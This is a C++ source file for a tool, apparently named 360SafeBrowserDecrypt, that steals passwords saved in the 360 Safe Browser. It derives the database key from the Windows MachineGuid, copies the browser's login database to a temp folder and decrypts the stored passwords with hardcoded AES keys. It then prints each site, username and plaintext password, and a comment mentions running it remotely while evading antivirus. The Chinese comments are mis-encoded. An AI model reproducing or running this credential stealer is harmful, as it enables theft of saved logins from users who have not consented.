#define _CRT_SECURE_NO_DEPRECATE
#ifndef SQLITE_HAS_CODEC
#define SQLITE_HAS_CODEC
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <iostream>
#include <vector>
#include  <io.h>        // _access
#include <shlobj.h>     // SHGetSpecialFolderPathA
#include "sqlite3.h"    // sqlite3�����ݿ����
#include "aes.h"        // aes����
#include "base64.h"     // base64����
#define  SQLITE3_STATIC

#pragma comment(lib,"crypt32.lib")  // base64������Ҫ
using namespace std;



// ����壺����ִ�е�sql�����
typedef struct _SQL_RESULT
{
    string domain;              // url
    string username;            // �û���
    string encrypt_password;            // ���ܵ�����
    string password;      // ���ܺ������

}SQL_RESULT, * LPSQL_RESULT;

// ȫ�ֱ������������н��
vector<_SQL_RESULT> g_vSqlResut;


// �ж��ļ��Ƿ����
int isFileExist(const char * filePath)
{
    /* Check for existence */
    if ((_access(filePath, 0)) != -1)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}

// ��ANSIת��ΪUnicode
wchar_t* AnsiToUnicode(const char* str)
{
    int textlen;
    wchar_t* result;
    textlen = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    result = (wchar_t*)malloc((textlen + 1) * sizeof(wchar_t));
    memset(result, 0, (textlen + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, str, -1, (LPWSTR)result, textlen);
    return result;
}

// ��Unicodeת��ΪANSI
char* UnicodeToAnsi(const wchar_t* szStr)
{
    int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
    if (nLen == 0)
    {
        return NULL;
    }
    char* pResult = new char[nLen];
    WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
    return pResult;
}

// ��ȡע���ĳ�����ĳ������ֵ
string RegQueryValueApi(HKEY hKey, const char* lpSubKeyG, const char* KeyValueG)
{
    
    HKEY hKeyResult = NULL;
    HKEY hKeyResultG = NULL;
    CHAR szLocation[MAX_PATH] = { '\0' };
    CHAR szLocationG[MAX_PATH] = { '\0' };
    DWORD dwSize = 0;
    DWORD dwSizeG = 0;
    DWORD dwDataType = 0;
    DWORD dwDataTypeG = 0;
    LONG ret = 0;
    LONG retG = 0;
    string value;

    if (ERROR_SUCCESS == RegOpenKeyExA(hKey, lpSubKeyG, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKeyResultG))
    {
        retG = RegQueryValueExA(hKeyResultG, KeyValueG, 0, &dwDataTypeG, NULL, &dwSizeG);
        // printf("RegQueryValueEx returns %d, dwSize=%d\n", retG, dwSizeG);

        retG = RegQueryValueExA(hKeyResultG, KeyValueG, 0, &dwDataTypeG, (LPBYTE)&szLocationG, &dwSizeG);
        // printf("RegQueryValueEx returns %d, dwSize=%d\n", retG, dwSizeG);

        if (ERROR_SUCCESS == ret)
        {
            // printf("Location: %s\n", szLocationG);
            value.append(szLocationG);
        }
        RegCloseKey(hKeyResultG);
    }

    return value;
}

// ִ��sql���
static int _callback_exec2(void* notused, int argc, char** argv, char** aszColName)
{
    printf("[+] url: %s\n", argv[0]);
    printf("[+] title: %s\n", argv[1]);

    return 0;
}

// ִ��sql���
static int _callback_exec(void* notused, int argc, char** argv, char** aszColName)
{
    
    SQL_RESULT SqlRet = {"", "", "", ""};
    SqlRet.domain = argv[0];
    SqlRet.username = argv[1];
    SqlRet.encrypt_password = argv[2];


    // printf("argc: %d\n", argc);
    

    /*
    printf("domain: %s\n", SqlRet.domain.data());
    printf("username: %s\n", SqlRet.username.data());
    printf("encrypt_password: %s\n", SqlRet.encrypt_password.data());
    */

    g_vSqlResut.push_back(SqlRet);

    
    
    printf("domain: %s\n", argv[0]);
    printf("username: %s\n", argv[1]);
    printf("password: %s\n", argv[2]);
    

    /*
    int i;
    for (i = 0; i < argc; i++)
    {
        printf("%s = %s\r\n", aszColName[i], argv[i] == 0 ? "NUL" : argv[i]);
    }
    */

    return 0;
}

// base64����
LPBYTE Base64Decode(LPCSTR lpBase64Str, LPDWORD lpdwLen)
{
    DWORD dwLen;
    DWORD dwNeed;
    LPBYTE lpBuffer = NULL;

    dwLen = strlen(lpBase64Str);
    dwNeed = 0;
    CryptStringToBinaryA(lpBase64Str, 0, CRYPT_STRING_BASE64, NULL, &dwNeed, NULL, NULL);
    if (dwNeed)
    {
        lpBuffer = (LPBYTE)malloc(dwNeed);
        CryptStringToBinaryA(lpBase64Str, 0, CRYPT_STRING_BASE64, lpBuffer, &dwNeed, NULL, NULL);
        *lpdwLen = dwNeed;
    }

    return lpBuffer;
}


// �ַ���ת��Ϊhash
void phex(uint8_t* str)
{

    unsigned char i;
    for (i = 0; i < 16; ++i)
        printf("%.2x", str[i]);
    printf("\n");
}

// aes��ecbģʽ����
string decrypt_ecb(LPBYTE lpEncryptPassword, DWORD length, uint8_t key[])
{
    // szEncryptPassword �洢���ܺ������
    UCHAR szEncryptPassword[1024];
    ZeroMemory(szEncryptPassword, 1024);
    CopyMemory(szEncryptPassword, lpEncryptPassword, length);

    // �ֿ飺ÿһ��16���ֽ�
    int num = length % 16 == 0 ? length / 16 : length / 16 + 1;
    // printf("num: %d\n", num);

    // ����ֿ���ܺ�����룬��ƴ�ӵ�һ��
    std::string aaa;
    aaa.clear();
    // �ֿ����
    for (int i = 0; i < num; ++i)
    {
        // buffer�� ����ÿһ����ܺ������
        uint8_t buffer[17];
        ZeroMemory(buffer, 17);
        AES128_ECB_decrypt(szEncryptPassword + (i * 16), key, buffer);
        // ��ӡ16���Ƶ�����
        // phex(buffer);
        aaa.append((PCHAR)buffer);
    }

    // ��ȡ����ĳ���
    int aaa_size = aaa.size();
    // printf("%d\n", aaa_size);

    unsigned char i;
    char cPassword[1024];       // ������ܺ������
    ZeroMemory(cPassword, 1024);
    int j = 0;
    int k = 0;
    
    // phex((uint8_t*)aaa.data());
    // printf("%.2x\n", aaa.at(0));


    if (aaa.at(0) == '\x02') {
        for (i = 1; i < aaa.size(); ++i) {
            // ȡż�����
            if (i % 2 != 0) {
                cPassword[j] = aaa.at(i);
                j += 1;
            }
        }
    }
    else {
        for (i = 1; i < aaa.size(); ++i) {
            // ȡ�������
            if (i % 2 == 0) {
                cPassword[k] = aaa.at(i);
                k += 1;
            }
        }
    }
    /*
    for (i = 1; i < aaa.size(); ++i) {
        // ȡż�����
        if (i % 2 != 0) {
            cPassword1[j] = aaa.at(i);
            j += 1;
        }
        // ȡ�������
        else {
            cPassword2[k] = aaa.at(i);
            k += 1;
        }
    }
    */

    string szPassword = cPassword;
    return szPassword;


}

// �ַ����ָ�
std::vector<std::string> splitString(const string strSrc, const string pattern)
{
    vector<string > resultstr;

    // ������ַ�����󣬿��Խ�ȡ���һ������
    std::string strcom = strSrc + pattern;
    auto pos = strSrc.find(pattern);
    auto len = strcom.size();

    //
    while (pos != std::string::npos)
    {
        std::string coStr = strcom.substr(0, pos);
        resultstr.push_back(coStr);

        strcom = strcom.substr(pos + pattern.size(), len);
        pos = strcom.find(pattern);
    }

    return resultstr;
}


VOID decrypt(string szMachineGuid, string dbPath)
{
    const char* sSQL;
    char* pErrMsg = 0;
    int ret = 0;
    sqlite3* db = 0;

    // �����ݿ�
    ret = sqlite3_open(dbPath.data(), &db);

    // ���ܵ�һ������
    ret = sqlite3_key(db, szMachineGuid.data(), 36);

    sSQL = "select url, title from tb_favorite;";
    sqlite3_exec(db, sSQL, _callback_exec2, 0, &pErrMsg);
    printf("-----------------------------------------------------------------------------------\n");

    //ȡ�����ݲ���ʾ
    /*
        domain = 192.168.144.137
        username = admin
        password = (4B01F200ED01)3DY0nFhWSWeYn32rXHa3vRVe2VdNa4W3FozP3jSQTyQ=
    */
    sSQL = "select domain, username, password from tb_account;";
    sqlite3_exec(db, sSQL, _callback_exec, 0, &pErrMsg);
    printf("-----------------------------------------------------------------------------------\n");
    

    //�ر����ݿ�
    sqlite3_close(db);
    db = 0;

    // ���һ����Կ��cf66fb58f5ca3485
    uint8_t key[] = { (uint8_t)0x63, (uint8_t)0x66, (uint8_t)0x36, (uint8_t)0x36, (uint8_t)0x66, (uint8_t)0x62, (uint8_t)0x35, (uint8_t)0x38, (uint8_t)0x66, (uint8_t)0x35, (uint8_t)0x63, (uint8_t)0x61, (uint8_t)0x33, (uint8_t)0x34, (uint8_t)0x38, (uint8_t)0x35 };


    // ����ÿһ�����
    for (int i = 0; i < g_vSqlResut.size(); i++)
    {
        // base64����
        DWORD sDW = 0;              // ����base64�������ַ����ĳ���
        const char* cBase64EncodeEncryptPassword = g_vSqlResut[i].encrypt_password.data();      // base64���������ģ�(4B01F200ED01)Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=
        // ��Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=���룬�õ����ܺ������
        LPBYTE lpEncryptPassword = Base64Decode(splitString(cBase64EncodeEncryptPassword, ")")[1].data(), &sDW);   // splitString(cBase64EncodeEncryptPassword, ")")[1].data() �ָ�����ż�������ַ���ɾ��

        // ����
        string szPassword;
        szPassword = decrypt_ecb(lpEncryptPassword, sDW, key);
        g_vSqlResut[i].password = szPassword;

        printf("[+] url: %s\n", g_vSqlResut[i].domain.data());
        printf("[+] username: %s\n", g_vSqlResut[i].username.data());
        printf("[+] password: %s\n", g_vSqlResut[i].password.data());
        printf("-----------------------------------------------------------------------------------\n");
    }
}

// δ��¼�û�������½���
int decryptNoUsers(string szMachineGuid, string sz360SafeBrowserInstallPath) {
    // ƴ��360��ȫ�������assis2.db·��
    string sz360SafeBrowserDatabasePath;
    sz360SafeBrowserDatabasePath.append(sz360SafeBrowserInstallPath);
    sz360SafeBrowserDatabasePath.append("360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db");
    // printf("[+] 360 SafeBrowser database path : %s\n", sz360SafeBrowserDatabasePath.data());

    // �ж���û�����ݿ�
    if (isFileExist(sz360SafeBrowserDatabasePath.data()))
    {
        printf("[+] No User Login. 360 SafeBrowser database path : %s\n", sz360SafeBrowserDatabasePath.data());
        printf("-----------------------------------------------------------------------------------\n");
    }
    else
    {
        printf("[-] No User Login. 360 SafeBrowser database not exist!\n");
        return 0;
    }

    // ��assis2.db���Ƶ�C:\windows\tempĿ¼��
    // WCHAR wcSourcePath[] = L"C:\\Users\\asdf\\AppData\\Roaming\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db";
    WCHAR* wcSourcePath;
    wcSourcePath = AnsiToUnicode(sz360SafeBrowserDatabasePath.data());
    WCHAR wcDestPath[] = L"C:\\windows\\temp\\assis2.db";
    CopyFileW(wcSourcePath, wcDestPath, false);

    decrypt(szMachineGuid, "C:\\windows\\temp\\assis2.db");


    return 1;
}


// ���ܵ�¼��360�û������ݿ�
int decryptUsers(string szMachineGuid, string sz360SafeBrowserInstallPath, vector <string> vUserFolderName)
{
    for (auto x : vUserFolderName) {
        printf("-----------------------------------------------------------------------------------------\n");
        printf("User: %s\n", x.data());
        string szUserDataBasePath;      // 360�û������ݿ�
        szUserDataBasePath.append(sz360SafeBrowserInstallPath);
        szUserDataBasePath.append(x);
        szUserDataBasePath.append("\\assis2.db");
        printf("[+] user folder : %s \n", szUserDataBasePath.data());

        // �ж���û�����ݿ�
        if (isFileExist(szUserDataBasePath.data()))
        {
            printf("[+] User Login. 360 SafeBrowser database path : %s\n", szUserDataBasePath.data());
        }
        else
        {
            printf("[-] User Login. 360 SafeBrowser database not exist!\n");
        }

        // ��assis2.db���Ƶ�C:\windows\tempĿ¼��
        // WCHAR wcSourcePath[] = L"C:\\Users\\asdf\\AppData\\Roaming\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db";
        WCHAR* wcSourcePath;
        wcSourcePath = AnsiToUnicode(szUserDataBasePath.data());
        wstring wszDestPath;
        wszDestPath.append(L"C:\\windows\\temp\\");
        wszDestPath.append(AnsiToUnicode(x.data()));
        wszDestPath.append(L".db");
        wprintf(L"[+] copy database to %s\n", wszDestPath);
        CopyFileW(wcSourcePath, wszDestPath.data(), false);



        const char* sSQL;
        char* pErrMsg = 0;
        int ret = 0;
        sqlite3* db = 0;


        // �����ݿ�
        ret = sqlite3_open(UnicodeToAnsi(wszDestPath.data()), &db);

        // ���ܵ�һ������
        ret = sqlite3_key(db, szMachineGuid.data(), 36);

        //ȡ�����ݲ���ʾ
        /*
            domain = 192.168.144.137
            username = admin
            password = (4B01F200ED01)3DY0nFhWSWeYn32rXHa3vRVe2VdNa4W3FozP3jSQTyQ=
        */
        sSQL = "select domain, username, password from tb_account;";
        sqlite3_exec(db, sSQL, _callback_exec, 0, &pErrMsg);

        //�ر����ݿ�
        sqlite3_close(db);
        db = 0;


        // ����ÿһ�����
        for (int i = 0; i < g_vSqlResut.size(); i++)
        {
            // base64����
            DWORD sDW = 0;              // ����base64�������ַ����ĳ���
            const char* cBase64EncodeEncryptPassword = g_vSqlResut[i].encrypt_password.data();      // base64���������ģ�(4B01F200ED01)Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=
            // ��Eaqv+DPy1payvjNT3up30RVe2VdNa4W3FozP3jSQTyQ=���룬�õ����ܺ������
            LPBYTE lpEncryptPassword = Base64Decode(splitString(cBase64EncodeEncryptPassword, ")")[1].data(), &sDW);   // splitString(cBase64EncodeEncryptPassword, ")")[1].data() �ָ�����ż�������ַ���ɾ��

            // ����û���¼����ô����Ҫ��һ����ܣ��õ���Կ��ce156aa425cc4f41
            // ��Կ1��ce156aa425cc4f41
            uint8_t key1[] = { (uint8_t)0x63, (uint8_t)0x65, (uint8_t)0x31, (uint8_t)0x35, (uint8_t)0x36, (uint8_t)0x61, (uint8_t)0x61, (uint8_t)0x34, (uint8_t)0x32, (uint8_t)0x35, (uint8_t)0x63, (uint8_t)0x63, (uint8_t)0x34, (uint8_t)0x66, (uint8_t)0x34, (uint8_t)0x31 };
            // ��Կ2��cf66fb58f5ca3485
            uint8_t key2[] = { (uint8_t)0x63, (uint8_t)0x66, (uint8_t)0x36, (uint8_t)0x36, (uint8_t)0x66, (uint8_t)0x62, (uint8_t)0x35, (uint8_t)0x38, (uint8_t)0x66, (uint8_t)0x35, (uint8_t)0x63, (uint8_t)0x61, (uint8_t)0x33, (uint8_t)0x34, (uint8_t)0x38, (uint8_t)0x35 };
            // ��Կ2��10a21c75b35e444f
            uint8_t key3[] = { (uint8_t)0x31, (uint8_t)0x30, (uint8_t)0x61, (uint8_t)0x32, (uint8_t)0x31, (uint8_t)0x63, (uint8_t)0x37, (uint8_t)0x35, (uint8_t)0x62, (uint8_t)0x33, (uint8_t)0x35, (uint8_t)0x65, (uint8_t)0x34, (uint8_t)0x34, (uint8_t)0x34, (uint8_t)0x66 };

            // ����
            string szPassword1;
            string szPassword2;
            szPassword1 = decrypt_ecb(lpEncryptPassword, sDW, key1);
            printf("szPassword1: %s\n", szPassword1.data());
            LPBYTE lpEncryptPassword2 = Base64Decode(splitString(szPassword1, ")")[1].data(), &sDW);   // splitString(cBase64EncodeEncryptPassword, ")")[1].data() �ָ�����ż�������ַ���ɾ��
            szPassword2 = decrypt_ecb(lpEncryptPassword2, sDW, key2);
            g_vSqlResut[i].password = szPassword2;

            printf("[+] url: %s\n", g_vSqlResut[i].domain.data());
            printf("[+] username: %s\n", g_vSqlResut[i].username.data());
            printf("[+] password: %s\n", g_vSqlResut[i].password.data());
            
        }

        printf("-----------------------------------------------------------------------------------\n");
    }






    return 1;
}



// �г���¼�û���ר���ļ�����
vector <string> listUsersFolder(char* path)
{
    vector <string> vUserFolderName;
    char findPath[100];
    ZeroMemory(findPath, 100);
    strcpy(findPath, path);
    strcat(findPath, "*.*");
    struct _finddata_t data;
    long hnd = _findfirst(findPath, &data);    // �����ļ�����������ʽchRE��ƥ���һ���ļ�
    if (hnd < 0)
    {
        perror(findPath);
    }
    int  nRet = (hnd < 0) ? -1 : 1;
    while (nRet >= 0)
    {
        // �����Ŀ¼
        if (data.attrib == _A_SUBDIR)
        {
            string foldName;
            foldName = data.name;
            // printf("[%s] : [%d]\n", foldName.data(), foldName.size());

            if (foldName.size() == 32)
            {
                // printf("[%s] : [%d]\n", foldName.data(), foldName.size());
                vUserFolderName.push_back(foldName.data());
                /*
                string szUserDataBasePath;      // 360�û������ݿ�
                szUserDataBasePath.append(path);
                szUserDataBasePath.append(foldName);
                szUserDataBasePath.append("\\assis2.db");
                printf("user folder : %s \n", szUserDataBasePath.data());
                vUserDataBasePath.push_back(szUserDataBasePath);
                */
            }

        }


        nRet = _findnext(hnd, &data);
    }
    _findclose(hnd);     // �رյ�ǰ���
    return vUserFolderName;
}

int main(int argc, char* argv[])
{
    printf("Usage: %s <szMachineGuid> <dbPath>\n", argv[0]);
    printf("Usage: 360SafeBrowserDecrypt.exe xxxxxx-xxxx-xxxx-xxxx-xxxxxxxxx assis2.db\n");

    // ���ļ��ϵ����ؽ��ܣ���Ҫ�õ������˻�id��assis2.db���ݿ�
    if (argc == 3) {
        printf("       %s %s %s\n", argv[0], argv[1], argv[2]);
        string szMachineGuid = argv[1];
        string dbPath = argv[2];
        printf("szMachineGuid: %s\ndbPath: %s\n", szMachineGuid.data(), dbPath.data());
        decrypt(szMachineGuid, dbPath);
    }
    // Զ�̼�������ܣ����ܲ���ɱ
    else {
        // ��ȡMachineGuid
        HKEY hKey = HKEY_LOCAL_MACHINE;
        const char* lpSubKeyG = "SOFTWARE\\MICROSOFT\\CRYPTOGRAPHY";
        const char* KeyValueG = "MachineGuid";
        string szMachineGuid;
        szMachineGuid = RegQueryValueApi(hKey, lpSubKeyG, KeyValueG);
        printf("[+] MachineGuid: %s\n", szMachineGuid.data());


        // ��ȡ360��ȫ�����exe������·������ע������ȡ    HKEY_CLASSES_ROOT\360SeSES��Ĭ��ֵ
        string sz360SafeBrowserExePath;
        sz360SafeBrowserExePath = RegQueryValueApi(HKEY_CLASSES_ROOT, "360SeSES\\DefaultIcon", "");
        // ͨ���ָ��ȡ360��ȫ������İ�װĿ¼
        // printf("[+] 360 SafeBrowser install path : %s\n", sz360SafeBrowserExePath.data());
        // const CHAR c360SafeBrowserInstallPath;
        string sz360SafeBrowserInstallPath;
        sz360SafeBrowserInstallPath = splitString(sz360SafeBrowserExePath.data(), "360se6")[0];
        printf("[+] 360 SafeBrowser install path : %s\n", sz360SafeBrowserInstallPath.data());

        // ����û���û���¼�����ݿ�
        decryptNoUsers(szMachineGuid, sz360SafeBrowserInstallPath);

        /*
        // ���ܵ�¼��360�û������ݿ�
        vector <string> vUserFolderName;
        vUserFolderName = listUsersFolder((char*)sz360SafeBrowserInstallPath.append("360se6\\User Data\\Default\\").data());
        decryptUsers(szMachineGuid, sz360SafeBrowserInstallPath, vUserFolderName);
        */
    }
    

    return 0;
}